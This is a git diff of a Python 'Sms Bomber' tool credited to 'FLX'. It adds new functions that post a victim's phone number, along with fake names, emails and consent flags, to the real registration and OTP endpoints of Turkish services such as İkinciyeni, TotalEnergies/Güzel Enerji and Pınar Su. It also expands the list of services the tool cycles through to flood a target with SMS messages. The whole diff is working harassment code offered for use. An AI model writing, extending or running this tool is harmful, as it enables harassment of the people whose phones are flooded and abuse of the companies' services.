@@ -5,7 +5,7 @@ import requests
 import time
 import uuid
 from colorama import init, Fore
-
+from urllib3.util import url
 
 init(autoreset=True)
 
@@ -440,41 +440,6 @@ def Bim(numara):
     except Exception as e:
         print(Fore.GREEN + "[+] Bim Başarılı!")
 
-def totalenergies(numara):
-    url = ("https://apimobile.guzelenerji.com.tr/exapi/profile")
-    payload = {
-    "city": "ADIYAMAN",
-    "cookie_allowed": True,
-    "county": "BESNİ",
-    "date_of_birth": "2001-01-01T00:00:00-03:00",
-    "email": "sms@yopmail.com",
-    "email_allowed": True,
-    "explicit_consent_permission": True,
-    "first_name": "Wsdawe",
-    "gender": "not_specify",
-    "kvkk": True,
-    "last_name": "Dawfwaf",
-    "last_online_time": "2025-06-25T04:27:17-03:00",
-    "member_type": 2,
-    "member_type_name": "Standart",
-    "membership_agreement": True,
-    "phone": "0"+numara,
-    "plate_number": "34ASD32",
-    "push_allowed": True,
-    "reference_type": 6,
-    "reference_type_name": "Web",
-    "sms_allowed": True
-    }
-    headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-    }
-    response = requests.post(url, json=payload, headers=headers)
-    if response.status_code == 200:
-        print(Fore.GREEN + "[+] Totalenergies Başarılı!")
-    else:
-        print(Fore.RED + "[-] Totalenergies Başarısız!")
-
 
 def komagene(numara, token=None):
     url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
@@ -498,7 +463,6 @@ def komagene(numara, token=None):
     else:
         print(Fore.RED + "[-] Komagene Başarısız!")
 
-import requests
 
 def ozdilekteyim(numara):
     base_url = "https://api.ozdilekteyim.com/rest/v2/magaza-magaza-store/sms/anonymous/sendotp"
@@ -520,13 +484,89 @@ def ozdilekteyim(numara):
         print(Fore.RED + "[-] Özdilekteyim Başarısız!")
 
 
-main = [ozdilekteyim, komagene, totalenergies,Bim , houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
+def ikinciyeni(numara):
+    url = "https://apigw.ikinciyeni.com/RegisterRequest"
+    payload = {
+        "accountType" : "1",
+        "email" : "sms@yopmail.com",
+        "isAddPermission" : True,
+        "lastName" : "sawdawd",
+        "name" : "edaweawe",
+        "phone" : numara,
+    }
+    headers = {
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN + "[+] İkinciyeni Başarılı!")
+    else:
+        print(Fore.RED + "[-] İkinciyeni Başarısız!")
+
+
+def totalenergies(numara):
+    url = "https://apimobile.guzelenerji.com.tr/exapi/profile"
+    payload =  {
+        "first_name": "Awddaw",
+        "last_name": "Dwaddwa",
+        "date_of_birth": "1977-07-08T00:00:00-03:00",
+        "gender": "not_specify",
+        "email": "sms@yopmail.com",
+        "phone": "0" + numara,
+        "city": "ADANA",
+        "county": "ALADAĞ",
+        "plate_number": "16ESA32",
+        "member_type": 2,
+        "member_type_name": "Standart",
+        "reference_type": 6,
+        "reference_type_name": "Web",
+        "call_allowed": True,
+        "sms_allowed": True,
+        "email_allowed": True,
+        "push_allowed": True,
+        "cookie_allowed": True,
+        "explicit_consent_permission": True,
+        "membership_agreement": True,
+        "kvkk": True,
+        "created_at": "2025-07-08T22:20:11-03:00",
+        "updated_at": "2025-07-08T22:20:11-03:00",
+        "last_online_time": "2025-07-08T22:20:11-03:00"
+    }
+    headers = {
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN + "[+] Totalenergies Başarılı!")
+    else:
+        print(Fore.RED + "[-] Totalenergies Başarısız!")
+
+
+def pinarsu(numara):
+    url = "https://yasampinarim.com.tr/Authentication/SendSms"
+    payload = {
+        "phone": numara,
+    }
+    headers = {
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN + "[+] Pinarsu Başarılı!")
+    else:
+        print(Fore.RED + "[-] Pinarsu Başarısız!")
+
+
+main = [pinarsu, totalenergies, ikinciyeni, ozdilekteyim, komagene, totalenergies, Bim, houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
 os.system("cls" if os.name == "nt" else "clear")
 for line in flx:
     print(Fore.RED + line)
 
 print("Developer By : FLX                    Sms Bomber\n")
-print(Fore.MAGENTA +"19 SMS SERVİS\n")
+print(Fore.MAGENTA +"20 SMS SERVİS\n")
 
 print(Fore.YELLOW + "1 - Normal Sms")
 print(Fore.YELLOW + "2 - Turbo Sms")
